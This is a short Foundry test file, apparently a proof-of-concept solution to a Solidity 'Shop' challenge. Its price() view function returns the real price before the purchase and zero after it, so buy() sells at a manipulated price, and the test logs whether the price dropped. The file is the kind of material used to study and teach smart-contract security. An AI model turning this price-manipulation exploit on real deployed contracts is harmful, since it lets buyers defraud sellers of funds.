// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Shop} from "src/Shop.sol";

contract Shop_POC is Test {
    Shop _shop;
    function init() private{
        vm.startPrank(address(0x10));
        _shop = new Shop();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_Shop_POC() public{
        uint256 price1 = _shop.price();
        _shop.buy();
        uint256 price2 = _shop.price();
        console.log("Success: ", price2 < price1);
    }
    function price() external view returns (uint256){
        if(!_shop.isSold()){
            return _shop.price();
        }else{
            return 0;
        }
    }
}
